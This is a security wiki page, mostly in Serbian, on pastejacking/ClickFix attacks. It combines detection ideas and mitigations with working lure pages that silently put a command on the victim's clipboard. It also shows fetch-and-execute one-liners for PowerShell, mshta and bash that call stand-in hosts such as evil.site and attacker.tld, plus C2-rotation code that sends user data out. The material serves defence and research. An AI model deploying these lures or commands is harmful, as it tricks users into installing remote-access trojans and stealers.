# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Nikada ne nalepite ništa što niste sami kopirali." – staro, ali i dalje validan savet

## Pregled

Clipboard hijacking – poznat i kao *pastejacking* – iskorišćava činjenicu da korisnici rutinski kopiraju i lepe komande bez da ih prethodno pregledaju. Zlonamerni web sajt (ili bilo koji JavaScript‑kompatibilan kontekst kao što su Electron ili Desktop aplikacija) programski postavlja tekst koji kontroliše napadač u sistemski clipboard. Žrtvama se, obično putem pažljivo osmišljenih social-engineering uputstava, savetuje da pritisnu **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ili da otvore terminal i *nalepе* sadržaj iz clipboard-a, čime se odmah izvršavaju proizvoljne komande.

Pošto se **ne preuzima nijedan fajl i ni jedan attachment se ne otvara**, tehnika zaobilazi većinu bezbednosnih kontrola za e‑poštu i web-sadržaj koje prate priloge, makroe ili direktno izvršavanje komandi. Zbog toga je napad popularan u phishing kampanjama koje distribuiraju commodity malware porodice poput NetSupport RAT, Latrodectus loader ili Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starije kampanje su koristile `document.execCommand('copy')`, novije se oslanjaju na asinhroni **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. Korisnik posećuje typosquatted ili compromised sajt (npr. `docusign.sa[.]com`)
2. Injektovani **ClearFake** JavaScript poziva pomoćnu funkciju `unsecuredCopyToClipboard()` koja tiho smešta Base64-encoded PowerShell one-liner u clipboard.
3. HTML uputstva kažu žrtvi da: *“Pritisni **Win + R**, nalepi komandu i pritisni Enter da rešiš problem.”*
4. `powershell.exe` se izvršava i preuzima arhivu koja sadrži legitimni izvršni fajl plus maliciozni DLL (classic DLL sideloading).
5. Loader dekriptuje dodatne faze, ubacuje shellcode i instalira persistence (npr. scheduled task) – i na kraju pokreće NetSupport RAT / Latrodectus / Lumma Stealer.

### Primer NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimni Java WebStart) pretražuje svoj direktorijum za `msvcp140.dll`.
* Zlonamerni DLL dinamički rešava API-je pomoću **GetProcAddress**, preuzima dva binarna fajla (`data_3.bin`, `data_4.bin`) preko **curl.exe**, dekriptuje ih koristeći rolling XOR key `"https://google.com/"`, ubacuje finalni shellcode i otpakiva **client32.exe** (NetSupport RAT) u `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Preuzima `la.txt` sa **curl.exe**
2. Pokreće JScript downloader unutar **cscript.exe**
3. Preuzima MSI payload → spušta `libcef.dll` pored potpisane aplikacije → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer preko MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Neke ClickFix kampanje u potpunosti preskaču preuzimanja fajlova i naređuju žrtvama da nalepi jedan‑liner koji fetches and executes JavaScript via WSH, persists it, and rotates C2 daily. Primer zabeleženog lanca:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ključne osobine
- Obfuscated URL reverzovan u runtime-u da bi se izbegla površna inspekcija.
- JavaScript perzistira putem Startup LNK (WScript/CScript) i bira C2 prema trenutnom danu – omogućavajući brzu domain rotation.

Minimalni JS fragment koji se koristi za rotiranje C2s po datumu:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
U narednoj fazi obično se raspoređuje loader koji uspostavlja persistence i preuzima RAT (npr. PureHVNC), često pinujući TLS na hardcoded certificate i chunking traffic.

Detection ideas specific to this variant
- Stablo procesa: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ili `cscript.exe`).
- Startup artifacts: LNK u `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` koji poziva WScript/CScript sa JS putanjom pod `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU i telemetrija komandne linije koja sadrži `.split('').reverse().join('')` ili `eval(a.responseText)`.
- Ponavljani `powershell -NoProfile -NonInteractive -Command -` sa velikim stdin payload-ovima koji hrane duge skripte bez dugih komandnih linija.
- Scheduled Tasks koji potom izvršavaju LOLBins kao što je `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` pod updater‑slično zadatkom/putanjom (npr. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Dnevno-rotirajući C2 hostnames i URL-ovi sa `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` obrascem.
- Korelirajte clipboard write događaje koji su praćeni Win+R paste-om pa neposrednim izvršenjem `powershell.exe`.

Blue-teams mogu kombinovati clipboard, process-creation i registry telemetriju da precizno lociraju zloupotrebu pastejacking-a:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` čuva istoriju **Win + R** komandi – tražite neobične Base64 / obfuskovane unose.
* Security Event ID **4688** (Process Creation) gde je `ParentImage` == `explorer.exe` i `NewProcessName` u { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** za kreiranja fajlova pod `%LocalAppData%\Microsoft\Windows\WinX\` ili u privremenim folderima neposredno pre sumnjivog 4688 događaja.
* EDR clipboard sensors (ako postoje) – korelirajte `Clipboard Write` koji je odmah praćen novim PowerShell procesom.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Nedavne kampanje masovno proizvode lažne CDN/browser verification pages ("Just a moment…", IUAM-style) koje primoravaju korisnike da kopiraju OS-specifične komande iz clipboard-a u native konzole. Ovo premešta izvršenje iz browser sandbox-a i radi na Windows i macOS.

Key traits of the builder-generated pages
- Detekcija OS-a preko `navigator.userAgent` radi prilagođavanja payload-ova (Windows PowerShell/CMD vs. macOS Terminal). Opcionalni decoy/no-op za nepodržane OS kako bi se održala iluzija.
- Automatsko clipboard-copy pri benignim UI akcijama (checkbox/Copy) dok se vidljivi tekst može razlikovati od sadržaja clipboard-a.
- Mobile blocking i popover sa uputstvima korak-po-korak: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opcionalna obfuskacija i single-file injector za prepisivanje DOM-a kompromitovanog sajta sa Tailwind-styled verification UI-jem (nije potrebna registracija novog domena).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Persistencija početnog pokretanja na macOS-u
- Koristite `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` da bi izvršavanje nastavilo nakon zatvaranja terminala, smanjujući vidljive artefakte.

In-place page takeover na kompromitovanim sajtovima
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ideje za detekciju i hunting specifične za IUAM-style mamce
- Web: Stranice koje vežu Clipboard API za verifikacione vidžete; neslaganje između prikazanog teksta i clipboard payload; `navigator.userAgent` grananje; Tailwind + single-page replace u sumnjivim kontekstima.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` kratko nakon interakcije sa browser-om; batch/MSI instalateri pokrenuti iz `%TEMP%`.
- macOS endpoint: Terminal/iTerm koji pokreće `bash`/`curl`/`base64 -d` sa `nohup` u blizini browser događaja; pozadinski procesi koji opstaju nakon zatvaranja terminala.
- Korelirajte `RunMRU` Win+R istoriju i upise u clipboard sa naknadnim kreiranjem konzolnih procesa.

Vidi takođe sledeće tehnike

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigacije

1. Ojačavanje pregledača – onemogućite clipboard write-access (`dom.events.asyncClipboard.clipboardItem` itd.) ili zahtevajte korisnički gest.
2. Bezbednosna svest – naučite korisnike da osetljive komande *ukucaju* ručno ili da ih prvo nalepе u tekst editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control za blokiranje proizvoljnih one-liners.
4. Mrežne kontrole – blokirajte outbound zahteve ka poznatim pastejacking i malware C2 domenima.

## Povezani trikovi

* **Discord Invite Hijacking** često zloupotrebljava isti ClickFix pristup nakon što korisnike navuče u maliciozni server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Reference

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
